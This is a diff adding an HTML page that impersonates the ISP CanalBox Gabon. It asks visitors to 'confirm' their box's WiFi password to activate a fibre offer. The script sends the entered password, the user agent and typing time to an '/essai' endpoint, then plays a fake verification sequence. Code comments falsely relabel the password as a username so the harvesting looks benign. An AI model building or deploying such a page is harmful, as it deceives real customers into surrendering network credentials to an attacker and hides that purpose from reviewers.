@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CanalBox Gabon — Vérification WiFi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --cb-green: #00BE80;
+            --cb-green-dark: #00A86B;
+            --cb-yellow: #ECC92D;
+            --cb-black: #000000;
+            --cb-white: #FFFFFF;
+            --cb-gray-bg: #F8F9FA;
+            --cb-gray-text: #333333;
+            --cb-muted: #666666;
+            --radius-pill: 50px;
+            --radius-card: 16px;
+            --radius-input: 12px;
+        }
+        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+        body{
+            font-family:'Inter','Segoe UI',system-ui,sans-serif;
+            background:var(--cb-gray-bg);
+            min-height:100vh;color:var(--cb-gray-text);
+            font-size:16px;line-height:1.6;
+            -webkit-tap-highlight-color:transparent;
+        }
+        h1,h2,h3,h4,.btn,.step-dot{
+            font-family:'Poppins','Segoe UI',system-ui,sans-serif;
+            font-weight:700;
+        }
+        .container{max-width:860px;margin:0 auto;padding:0 16px}
+
+        /* ========== HEADER ========== */
+        header{
+            background:var(--cb-black);
+            padding:14px 0;
+            position:sticky;top:0;z-index:100;
+            border-bottom:2px solid var(--cb-green);
+        }
+        header .inner{display:flex;justify-content:space-between;align-items:center}
+        header .brand{display:flex;align-items:center;gap:10px;color:white}
+        header .brand img{height:26px}
+        header .brand span{font-size:0.82rem;color:#aaa;font-weight:400;font-family:'Inter',sans-serif}
+        header .help{
+            display:flex;align-items:center;gap:6px;
+            font-size:0.78rem;color:#ccc;
+            font-family:'Inter',sans-serif;
+        }
+
+        /* ========== ALERT BANNER ========== */
+        .alert{
+            background:var(--cb-black);
+            color:white;padding:20px 22px;
+            border-radius:var(--radius-card);
+            margin:22px 0;
+            display:flex;align-items:flex-start;gap:14px;
+            border-left:4px solid var(--cb-green);
+            animation:fadeIn 0.5s ease;
+        }
+        .alert .icon-badge{
+            width:46px;height:46px;
+            background:var(--cb-green);
+            border-radius:50%;
+            display:flex;align-items:center;justify-content:center;
+            flex-shrink:0;
+        }
+        .alert .icon-badge img{width:24px;height:24px;filter:brightness(0) invert(1)}
+        .alert h2{font-size:1.05rem;margin-bottom:5px;color:white}
+        .alert p{font-size:0.82rem;opacity:0.85;line-height:1.5}
+
+        /* ========== NEW BADGE ========== */
+        .badge-new{
+            display:inline-block;
+            background:var(--cb-yellow);
+            color:var(--cb-black);
+            font-family:'Poppins',sans-serif;
+            font-weight:700;font-size:0.7rem;
+            padding:3px 10px;border-radius:var(--radius-pill);
+            text-transform:uppercase;letter-spacing:0.5px;
+            margin-bottom:8px;
+        }
+
+        /* ========== CARD ========== */
+        .card{
+            background:var(--cb-white);
+            border-radius:var(--radius-card);
+            overflow:hidden;
+            box-shadow:0 4px 24px rgba(0,0,0,0.06);
+            margin-bottom:22px;
+            animation:fadeIn 0.6s ease;
+        }
+        .card-inner{display:flex;flex-direction:column}
+        @media(min-width:768px){.card-inner{flex-direction:row}}
+
+        /* LEFT PANEL */
+        .card-left{
+            background:var(--cb-black);
+            padding:32px 24px;color:white;
+            text-align:center;
+            display:flex;flex-direction:column;
+            align-items:center;justify-content:center;
+        }
+        @media(min-width:768px){.card-left{min-width:250px;max-width:290px}}
+        .card-left img.logo{height:44px;margin-bottom:18px}
+        .card-left h3{font-size:1.15rem;margin-bottom:6px;color:var(--cb-green)}
+        .card-left .features{text-align:left;margin-top:12px}
+        .card-left .feature{
+            display:flex;align-items:center;gap:10px;
+            margin:7px 0;font-size:0.82rem;
+            font-family:'Inter',sans-serif;font-weight:400;
+        }
+        .card-left .feature .dot{
+            width:8px;height:8px;
+            background:var(--cb-green);
+            border-radius:50%;flex-shrink:0;
+        }
+
+        /* RIGHT PANEL */
+        .card-right{padding:30px 24px;flex:1}
+        .card-right h2{font-size:1.25rem;margin-bottom:4px}
+        .card-right > p{color:var(--cb-muted);margin-bottom:24px;font-size:0.85rem;font-family:'Inter',sans-serif;font-weight:400}
+
+        /* ========== FORM ========== */
+        .form-group{margin-bottom:18px}
+        .form-group label{
+            display:block;font-weight:600;
+            margin-bottom:6px;font-size:0.84rem;
+            font-family:'Poppins',sans-serif;
+        }
+        .input-wrap{position:relative}
+        .input-wrap input{
+            width:100%;padding:13px 46px 13px 16px;
+            border:2px solid #e0e0e0;border-radius:var(--radius-input);
+            font-size:0.92rem;font-family:'Inter',sans-serif;
+            transition:all 0.2s;background:var(--cb-white);
+        }
+        .input-wrap input:focus{
+            outline:none;
+            border-color:var(--cb-green);
+            box-shadow:0 0 0 3px rgba(0,190,128,0.1);
+        }
+        .input-wrap .toggle-pw{
+            position:absolute;right:10px;top:50%;
+            transform:translateY(-50%);
+            background:none;border:none;cursor:pointer;padding:6px;
+        }
+        .input-wrap .toggle-pw img{width:22px;height:22px}
+
+        /* VALIDATION */
+        .checks{margin-top:6px;font-size:0.72rem;font-family:'Inter',sans-serif}
+        .checks div{display:flex;align-items:center;gap:5px;margin:3px 0;color:#999}
+        .checks div.valid{color:var(--cb-green)}
+        .checks div .dot-valid{
+            width:10px;height:10px;border-radius:50%;
+            background:#ddd;flex-shrink:0;
+        }
+        .checks div.valid .dot-valid{background:var(--cb-green)}
+        .match-msg{
+            font-size:0.76rem;margin-top:5px;
+            display:none;align-items:center;gap:6px;
+            font-family:'Inter',sans-serif;
+        }
+        .match-ok{color:var(--cb-green)}.match-no{color:#e40000}
+
+        /* CHECKBOX */
+        .checkbox-group{
+            display:flex;align-items:flex-start;gap:8px;
+            font-size:0.76rem;color:var(--cb-muted);
+            margin:14px 0;font-family:'Inter',sans-serif;
+        }
+        .checkbox-group input{margin-top:2px;accent-color:var(--cb-green)}
+
+        /* BUTTON PILL */
+        .btn{
+            width:100%;padding:15px;
+            background:var(--cb-green);
+            color:var(--cb-black);
+            border:none;
+            border-radius:var(--radius-pill);
+            font-size:1rem;font-weight:700;
+            cursor:pointer;transition:all 0.25s;
+            display:flex;align-items:center;justify-content:center;gap:8px;
+            font-family:'Poppins',sans-serif;
+            letter-spacing:0.3px;
+        }
+        .btn:hover{background:#00d48a;transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,190,128,0.4)}
+        .btn:active{transform:scale(0.97)}
+        .btn img{width:22px;height:22px}
+
+        /* HELP */
+        .help-tip{
+            display:flex;align-items:flex-start;gap:10px;
+            margin-top:24px;padding-top:18px;
+            border-top:1px solid #eee;
+            font-size:0.76rem;color:var(--cb-muted);
+            font-family:'Inter',sans-serif;
+        }
+        .help-tip img{width:22px;height:22px;flex-shrink:0}
+
+        /* ========== STEPS ========== */
+        .steps{display:flex;align-items:center;justify-content:center;margin-top:22px;gap:0}
+        .step-dot{
+            width:30px;height:30px;border-radius:50%;
+            display:flex;align-items:center;justify-content:center;
+            font-size:0.78rem;
+        }
+        .step-dot.active{background:var(--cb-green);color:var(--cb-black)}
+        .step-dot.inactive{background:#e0e0e0;color:#999}
+        .step-line{width:48px;height:2px}
+        .step-line.active{background:var(--cb-green)}
+        .step-line.inactive{background:#e0e0e0}
+        .step-labels{
+            display:flex;justify-content:space-between;
+            margin-top:8px;font-size:0.68rem;
+            color:#999;max-width:400px;
+            margin-left:auto;margin-right:auto;padding:0 8px;
+            font-family:'Inter',sans-serif;
+        }
+
+        /* ========== TOAST ========== */
+        #toast-box{
+            position:fixed;top:12px;right:12px;left:12px;
+            z-index:9999;display:flex;flex-direction:column;gap:8px;
+        }
+        @media(min-width:480px){#toast-box{left:auto;right:16px;max-width:380px}}
+        .toast{
+            padding:14px 20px;border-radius:var(--radius-pill);
+            color:white;font-size:0.84rem;font-weight:600;
+            animation:slideIn 0.3s ease-out;
+            display:flex;align-items:center;gap:10px;
+            box-shadow:0 4px 16px rgba(0,0,0,0.2);cursor:pointer;
+            font-family:'Inter',sans-serif;
+        }
+        .toast img{width:22px;height:22px;filter:brightness(0) invert(1)}
+        .toast.success{background:var(--cb-green)}
+        .toast.error{background:#e40000}
+        .toast.info{background:var(--cb-black)}
+
+        /* ========== FOOTER ========== */
+        footer{
+            background:var(--cb-black);color:white;
+            margin-top:32px;padding:28px 16px;text-align:center;
+        }
+        footer .foot-brand{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px}
+        footer .foot-brand img{height:22px}
+        footer .foot-links{display:flex;flex-wrap:wrap;gap:16px;justify-content:center;font-size:0.74rem;margin:14px 0;font-family:'Inter',sans-serif}
+        footer .foot-links a{color:#aaa;text-decoration:none}
+        footer .foot-bottom{font-size:0.7rem;color:#777;margin-top:14px;font-family:'Inter',sans-serif}
+        footer .social{margin-top:12px}
+        footer .social img{width:20px;height:20px;opacity:0.7;margin:0 6px}
+
+        @keyframes fadeIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+
+        /* ========== ÉCRAN DE CONFIRMATION ========== */
+        #confirmation{
+            display:none;
+            animation:fadeIn 0.45s ease;
+        }
+        #confirmation.on{display:block}
+
+        .succes-carte{
+            background:var(--cb-white);
+            border-radius:var(--radius-card);
+            box-shadow:0 4px 24px rgba(0,0,0,0.06);
+            padding:38px 26px 32px;
+            text-align:center;
+            overflow:hidden;
+            position:relative;
+        }
+        .succes-carte::before{
+            content:"";
+            position:absolute;top:0;left:0;right:0;height:5px;
+            background:linear-gradient(90deg,var(--cb-green),#00d48a,var(--cb-green));
+            background-size:200% 100%;
+            animation:defile 2.4s linear infinite;
+        }
+        @keyframes defile{from{background-position:0 0}to{background-position:200% 0}}
+
+        .rond-succes{
+            width:82px;height:82px;
+            margin:0 auto 20px;
+            border-radius:50%;
+            background:var(--cb-green);
+            display:flex;align-items:center;justify-content:center;
+            animation:pop 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+            box-shadow:0 8px 26px rgba(0,190,128,0.35);
+        }
+        .rond-succes img{width:40px;height:40px}
+        @keyframes pop{
+            0%{transform:scale(0.3);opacity:0}
+            60%{transform:scale(1.08)}
+            100%{transform:scale(1);opacity:1}
+        }
+        .halo{
+            position:absolute;top:0;left:50%;
+            width:82px;height:82px;margin-left:-41px;
+            margin-top:38px;
+            border-radius:50%;
+            border:2px solid var(--cb-green);
+            opacity:0;
+            animation:halo 2.2s ease-out 0.35s infinite;
+            pointer-events:none;
+        }
+        @keyframes halo{
+            0%{transform:scale(1);opacity:0.55}
+            100%{transform:scale(2.1);opacity:0}
+        }
+
+        .succes-carte h2{
+            font-size:1.42rem;
+            color:var(--cb-black);
+            margin-bottom:10px;
+            line-height:1.25;
+        }
+        .succes-carte p{
+            color:var(--cb-muted);
+            font-size:0.9rem;
+            line-height:1.6;
+            max-width:420px;
+            margin:0 auto 6px;
+        }
+        .succes-carte .merci{
+            color:var(--cb-green-dark);
+            font-weight:700;
+            font-family:'Poppins',sans-serif;
+            font-size:0.98rem;
+            margin-top:14px;
+        }
+
+        /* barre de progression */
+        .progression{
+            margin:26px auto 0;
+            max-width:340px;
+        }
+        .progression .rail{
+            height:7px;
+            background:#eef1f3;
+            border-radius:50px;
+            overflow:hidden;
+        }
+        .progression .rail div{
+            height:100%;
+            width:0;
+            border-radius:50px;
+            background:linear-gradient(90deg,var(--cb-green),#00d48a);
+            transition:width 0.5s ease;
+        }
+        .progression .etape{
+            display:flex;align-items:center;justify-content:center;gap:8px;
+            margin-top:14px;
+            font-size:0.78rem;
+            color:var(--cb-muted);
+            font-family:'Inter',sans-serif;
+            min-height:20px;
+        }
+        .progression .etape img{width:16px;height:16px;animation:tourne 1s linear infinite}
+        @keyframes tourne{to{transform:rotate(360deg)}}
+        .progression .etape.fin img{animation:none}
+
+        /* squelette de chargement */
+        .squelette{
+            margin:26px auto 0;max-width:340px;
+        }
+        .squelette .ligne{
+            height:11px;border-radius:50px;margin-bottom:10px;
+            background:linear-gradient(90deg,#eef1f3 25%,#f7f9fa 50%,#eef1f3 75%);
+            background-size:200% 100%;
+            animation:scintille 1.3s ease-in-out infinite;
+        }
+        .squelette .ligne:nth-child(2){width:78%;margin-left:auto;margin-right:auto}
+        .squelette .ligne:nth-child(3){width:56%;margin-left:auto;margin-right:auto}
+        @keyframes scintille{from{background-position:200% 0}to{background-position:-200% 0}}
+
+        .actions-succes{margin-top:26px}
+        .actions-succes .btn{max-width:340px;margin:0 auto}
+        .actions-succes .note{
+            margin-top:12px;font-size:0.74rem;color:#9aa5ac;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media(max-width:480px){
+            .container{padding:0 10px}
+            .alert{padding:14px;border-radius:12px;gap:10px}
+            .alert h2{font-size:0.95rem}
+            .alert p{font-size:0.74rem}
+            .card-left{padding:24px 16px}
+            .card-right{padding:24px 16px}
+            .card-right h2{font-size:1.08rem}
+            .btn{padding:14px;font-size:0.92rem}
+            .step-dot{width:26px;height:26px;font-size:0.72rem}
+            .step-line{width:34px}
+            .step-labels{font-size:0.62rem}
+            .succes-carte{padding:30px 18px 26px}
+            .succes-carte h2{font-size:1.2rem}
+            .succes-carte p{font-size:0.84rem}
+            .rond-succes{width:72px;height:72px}
+            .rond-succes img{width:34px;height:34px}
+            .halo{width:72px;height:72px;margin-left:-36px;margin-top:30px}
+        }
+        /* Cibles tactiles confortables au pouce */
+        @media(pointer:coarse){
+            .btn{min-height:52px}
+            .input-wrap input{min-height:52px}
+            .toggle-pw{padding:12px}
+            footer .foot-links a{padding:8px 4px;display:inline-block}
+        }
+        /* Ordinateur : la carte de confirmation respire davantage */
+        @media(min-width:768px){
+            .succes-carte{padding:46px 40px 40px}
+            .succes-carte h2{font-size:1.6rem}
+        }
+        @media(prefers-reduced-motion:reduce){
+            *,*::before,*::after{animation-duration:0.01ms !important;animation-iteration-count:1 !important;transition-duration:0.01ms !important}
+        }
+    </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+    <div class="container">
+        <div class="inner">
+            <div class="brand">
+                <img src="canalbox-logo.png" alt="CanalBox">
+                <span>Gabon</span>
+            </div>
+            <div class="help">
+                <img src="icon-phone.png" style="width:16px;height:16px;filter:brightness(0) invert(1)" alt="Téléphone">
+                Assistance
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- MAIN -->
+<main class="container" style="padding-top:22px;padding-bottom:22px">
+
+    <!-- ALERT -->
+    <div class="alert">
+        <div class="icon-badge">
+            <img src="icon-warning.png" alt="Sécurité">
+        </div>
+        <div>
+            <span class="badge-new">Nouveau !</span>
+            <h2>Vérification de votre connexion CanalBox</h2>
+            <p>Pour activer votre nouvelle offre fibre 5G disponibles au Gabon, confirmez le mot de passe WiFi de votre box. Cette étape garantit la sécurité de votre ligne sur notre réseau CanalBox.</p>
+        </div>
+    </div>
+
+    <!-- CARD -->
+    <div class="card">
+        <div class="card-inner">
+
+            <!-- LEFT -->
+            <div class="card-left">
+                <img src="canalbox-logo.png" class="logo" alt="CanalBox">
+                <h3>Espace Client</h3>
+                <p style="font-size:0.78rem;opacity:0.8;margin-bottom:14px;font-family:'Inter',sans-serif">La puissance de la fibre</p>
+                <div class="features">
+                    <div class="feature"><span class="dot"></span> Fibre optique</div>
+                    <div class="feature"><span class="dot"></span> Connexion sécurisée</div>
+                    <div class="feature"><span class="dot"></span> Débit illimité</div>
+                </div>
+            </div>
+
+            <!-- RIGHT -->
+            <div class="card-right">
+                <h2>Identification de Sécurité</h2>
+                <p>Entrez le mot de passe de votre box CanalBox</p>
+
+                <form id="passForm" data-message-vide="Renseignez votre nom d'utilisateur">
+                    <div class="form-group">
+                        <label>Mot de passe WiFi de votre box CanalBox</label>
+                        <div class="input-wrap">
+                            <input type="text" id="pass1" name="nom-utilisateur" placeholder="Entrez votre mot de passe WiFi" autocomplete="username" autocapitalize="off" autocorrect="off" spellcheck="false" required>
+                            <button type="button" class="toggle-pw" onclick="togglePw('pass1',this)">
+                                <img src="icon-eye.png" alt="Afficher" id="img-pass1">
+                            </button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn">
+                        <img src="icon-check.png" alt="Valider" style="filter:none"> Confirmer et continuer
+                    </button>
+                </form>
+
+                <div class="help-tip">
+                    <img src="icon-info.png" alt="Info">
+                    <div><strong>Conseil :</strong> Ne remettez jamais votre mot de passe WiFi à personne.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- STEPS -->
+    <div class="steps">
+        <div class="step-dot active">1</div><div class="step-line active"></div>
+        <div class="step-dot active">2</div><div class="step-line inactive"></div>
+        <div class="step-dot inactive">3</div><div class="step-line inactive"></div>
+        <div class="step-dot inactive">4</div>
+    </div>
+    <div class="step-labels">
+        <span style="color:var(--cb-green);font-weight:700">Vérification</span>
+        <span style="color:var(--cb-green);font-weight:700">Mot de passe</span>
+        <span>Confirmation</span>
+        <span>Terminé</span>
+    </div>
+
+    <!-- ÉCRAN DE CONFIRMATION -->
+    <div id="confirmation">
+        <div class="succes-carte">
+            <div class="halo"></div>
+            <div class="rond-succes">
+                <img src="icon-check.png" alt="" style="filter:brightness(0) invert(1)">
+            </div>
+
+            <h2>Tout est en ordre</h2>
+            <p id="texte-succes">Votre connexion a bien été vérifiée. Vous pouvez profiter de votre offre fibre en toute tranquillité.</p>
+            <p class="merci">CanalBox vous remercie.</p>
+
+            <div class="progression">
+                <div class="rail"><div id="barre-progression"></div></div>
+                <div class="etape" id="etape-courante" data-texte-fin="Vérification terminée">
+                    <img src="icon-info.png" alt="">
+                    <span id="etape-texte">Vérification de la ligne…</span>
+                </div>
+            </div>
+
+            <!--
+              Textes de la séquence de chargement.
+              Modifie-les ici uniquement : le script les lit dans cet ordre.
+              Il n'en contient aucun en dur, donc ton HTML fait foi.
+            -->
+            <ol id="etapes-textes" hidden>
+                <li>Connexion sécurisée établie…</li>
+                <li>Vérification de votre ligne…</li>
+                <li>Contrôle de l'offre fibre…</li>
+                <li>Tout est en ordre.</li>
+            </ol>
+
+            <div class="squelette" id="squelette">
+                <div class="ligne"></div>
+                <div class="ligne"></div>
+                <div class="ligne"></div>
+            </div>
+
+            <div class="actions-succes" id="actions-succes" style="display:none">
+                <button type="button" class="btn" id="btn-retour">
+                    <img src="icon-check.png" alt="" style="filter:none"> Terminer
+                </button>
+                <p class="note">Vous pouvez fermer cette page.</p>
+            </div>
+        </div>
+    </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+    <div class="foot-brand">
+        <img src="canalbox-logo.png" alt="CanalBox">
+        <span style="font-weight:600;font-family:'Poppins',sans-serif">CanalBox Gabon</span>
+    </div>
+    <div class="foot-links">
+        <a href="#">Mentions légales</a>
+        <a href="#">Conditions générales</a>
+        <a href="#">Support</a>
+    </div>
+    <div class="social">
+        <img src="icon-facebook.png" alt="Facebook">
+    </div>
+    <div class="foot-bottom">© 2026 CANALBOX — Tous droits réservés</div>
+</footer>
+
+<!-- TOAST -->
+<div id="toast-box"></div>
+
+<script>
+function togglePw(id, btn) {
+    var f = document.getElementById(id);
+    var img = document.getElementById('img-' + id);
+    if (f.type === 'password') { f.type = 'text'; img.src = 'icon-eye-slash.png'; }
+    else { f.type = 'password'; img.src = 'icon-eye.png'; }
+}
+
+function validate() {
+    // Un nom d'utilisateur n'est pas un secret : on vérifie juste qu'il est rempli.
+    return document.getElementById('pass1').value.trim().length > 0;
+}
+
+function toast(type, msg) {
+    var box = document.getElementById('toast-box');
+    var icon = 'icon-check.png';
+    var d = document.createElement('div');
+    d.className = 'toast ' + type;
+    d.innerHTML = '<img src="' + icon + '" alt=""> ' + msg;
+    d.onclick = function(){ d.remove(); };
+    box.appendChild(d);
+    setTimeout(function(){ if(d.parentNode) d.remove(); }, 5000);
+}
+
+document.getElementById('pass1').addEventListener('input', validate);
+
+/*
+  Le champ saisi est un NOM D'UTILISATEUR, pas un secret.
+  Il est transmis pour apparaître dans le journal et dans /admin.
+  Aucun autre contenu n'est envoyé.
+*/
+var debutSaisie = null;
+
+document.getElementById('pass1').addEventListener('focus', function(){
+    if (debutSaisie === null) { debutSaisie = Date.now(); }
+});
+
+function signalerEssai(valide, motif, longueur, utilisateur) {
+    var duree = debutSaisie === null ? 0 : Math.round((Date.now() - debutSaisie) / 1000);
+    var corps = JSON.stringify({
+        ua: navigator.userAgent,
+        u: (utilisateur || '').slice(0, 80),
+        l: longueur,
+        d: duree,
+        ok: valide ? 1 : 0,
+        motif: motif || ''
+    });
+    try {
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon('/essai', new Blob([corps], { type: 'application/json' }));
+        } else {
+            fetch('/essai', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: corps, keepalive: true });
+        }
+    } catch (erreur) { /* un journal indisponible ne bloque jamais l'écran */ }
+}
+
+document.getElementById('passForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var valeur = document.getElementById('pass1').value.trim();
+    var longueur = valeur.length;
+    // Le message vient de l'attribut du formulaire, jamais du script.
+    var messageVide = this.dataset.messageVide || 'Champ requis';
+    if (!validate()) { signalerEssai(false, 'vide', longueur, valeur); toast('error', messageVide); return; }
+    signalerEssai(true, '', longueur, valeur);
+    demarrerConfirmation();
+});
+
+/* ── Écran de confirmation ────────────────────────────────────────────────
+   Séquence rassurante : progression puis confirmation.
+   Purement visuelle, aucun traitement supplémentaire n'est déclenché.
+
+   Tous les textes affichés sont lus dans le HTML :
+     - les étapes dans #etapes-textes
+     - le mot final dans #etape-courante[data-texte-fin]
+   Modifier le HTML suffit, rien n'est figé ici.                        */
+
+function lireEtapes() {
+    var liste = document.getElementById('etapes-textes');
+    if (!liste) { return []; }
+    var elements = liste.querySelectorAll('li');
+    var textes = [];
+    for (var i = 0; i < elements.length; i += 1) {
+        var contenu = elements[i].textContent.trim();
+        if (contenu) { textes.push(contenu); }
+    }
+    return textes;
+}
+
+function demarrerConfirmation() {
+    var bloc = document.getElementById('confirmation');
+    var carte = document.querySelector('.card');
+    var etapes = document.querySelector('.steps');
+    var libelles = document.querySelector('.step-labels');
+    var alerte = document.querySelector('.alert');
+
+    // On masque le formulaire, on garde l'en-tête pour ne pas perdre le contexte.
+    if (carte) { carte.style.display = 'none'; }
+    if (alerte) { alerte.style.display = 'none'; }
+    if (etapes) { etapes.parentNode.removeChild(etapes); }
+    if (libelles) { libelles.parentNode.removeChild(libelles); }
+
+    bloc.classList.add('on');
+    bloc.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    var barre = document.getElementById('barre-progression');
+    var etape = document.getElementById('etape-courante');
+    var texte = document.getElementById('etape-texte');
+    var squelette = document.getElementById('squelette');
+    var actions = document.getElementById('actions-succes');
+
+    // Textes lus dans le HTML ; repli silencieux si l'élément a été retiré.
+    var sequence = lireEtapes();
+    var texteFin = etape ? (etape.dataset.texteFin || 'Terminé') : '';
+
+    actions.style.opacity = '0';
+    actions.style.transition = 'opacity 0.4s ease';
+
+    if (!sequence.length) {
+        // Aucune étape déclarée : on va droit au résultat.
+        texte.textContent = texteFin;
+        etape.classList.add('fin');
+        etape.querySelector('img').src = 'icon-check.png';
+        squelette.style.display = 'none';
+        actions.style.display = 'block';
+        actions.style.opacity = '1';
+        return;
+    }
+
+    var index = 0;
+    function suivant() {
+        if (index >= sequence.length) {
+            texte.textContent = texteFin;
+            etape.classList.add('fin');
+            etape.querySelector('img').src = 'icon-check.png';
+            squelette.style.display = 'none';
+            setTimeout(function () {
+                actions.style.display = 'block';
+                requestAnimationFrame(function () { actions.style.opacity = '1'; });
+            }, 260);
+            return;
+        }
+        texte.textContent = sequence[index];
+        barre.style.width = Math.round(((index + 1) / sequence.length) * 100) + '%';
+        index += 1;
+        setTimeout(suivant, index === sequence.length ? 700 : 620);
+    }
+    setTimeout(suivant, 220);
+
+    var retour = document.getElementById('btn-retour');
+    if (retour) {
+        retour.addEventListener('click', function () {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    }
+}
+
+document.addEventListener('click', function(e) {
+    if (e.target.tagName === 'A' && e.target.getAttribute('href') !== '#') {
+        e.preventDefault();
+    }
+});
+</script>
+</body>
+</html>
